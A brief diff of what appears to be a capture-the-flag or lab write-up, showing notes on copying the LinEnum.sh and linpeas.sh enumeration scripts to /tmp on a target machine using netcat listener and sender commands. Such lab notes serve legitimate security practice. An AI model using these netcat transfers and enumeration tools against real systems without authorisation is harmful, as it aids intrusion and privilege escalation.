@@ -372,9 +372,8 @@ target_ip : 10.10.206.228
 
  copied LinEnum.sh, linpeas.sh to /tmp.  using :
 	- for receiver `nc -l -p 4444 > expected_file`
- 	- for sender `nc -w 3 <receiver_ip> 4444 < expected_file`
-
- 	and set as a executable
+ 	- for sender `nc -w 3 <receiver_ip> 4444 < expected_file` 
+ and set as a executable
 
 **Action 3 - doing unnecessary things**
 
